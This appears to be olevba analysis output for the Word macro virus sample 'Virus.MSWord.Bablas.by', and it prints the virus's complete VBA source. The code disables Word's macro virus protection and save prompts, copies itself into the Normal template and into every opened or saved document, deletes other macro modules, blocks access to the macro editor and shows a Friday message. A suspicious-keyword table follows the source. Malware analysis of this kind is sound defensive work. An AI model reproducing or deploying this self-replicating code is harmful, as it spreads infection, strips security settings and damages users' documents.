olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bablas.by
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bablas.by - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ipulnr.bas 
in file: ./Virus.MSWord.Bablas.by - OLE stream: 'Macros/VBA/ipulnr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileExit()

End Sub

Sub ShowMessage()
    H = Time
    If (WeekDay(Date) = vbFriday) Then
    For i = 1 To 100
        Beep
    Next i
    H = MsgBox("Kupersembahkan virus macro ini untuk seorang kawan berinisial Gemini 15/6/79. Semoga ia masih mengingatku. " & Chr(13) & _
    "Terima kasih kepada teman-teman yang membantu tersebarnya virus ini. Jika Anda mendapati pesan ini, abaikan saja karena virus ini tidak berbahaya sama sekali. " & Chr(13) & Chr(13) & _
    "TULUNGAGUNG KOTA BERSINAR" & Chr(13) & Chr(13) & "Sinar datang dari Surga.", vbOKOnly + vbExclamation, "Untukmu Kawan")
    End If
End Sub

Sub Bablas()
Attribute Bablas.VB_Description = "Macro created 10/02/99 by  Abdul Aziz"
Attribute Bablas.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Cegat"
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ToolsMacro()
    H = MsgBox("You can't create or modify macros.", vbExclamation + vbOKOnly)
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "ipulnr") = "ipul" Then Application.ShowVisualBasicEditor = True
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "ipulnr" Then DocOk = True
        If Obj.Name <> "ipulnr" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="ipulnr", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "ipulnr" Then NorOk = True
        If Obj.Name <> "ipulnr" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="ipulnr", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    ShowMessage
    Application.Quit
End Sub

Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Bablas
    SikatTemplate
    On Error Resume Next
    NormalTemplate.Save
End Sub

Sub AutoClose()
    SikatDocument
End Sub

Sub FileClose()
    AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
        If ActiveDocument.Name <> "Document1" Then
            Normal.ipulnr.SikatDocument
            WordBasic.DisableAutoMacros False
        End If
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.ipulnr.Ancurin"
    End If
End Sub

Sub AutoExec()
    On Error Resume Next
    WordBasic.DisableAutoMacros True
    Bablas
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.ipulnr.Ancurin"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

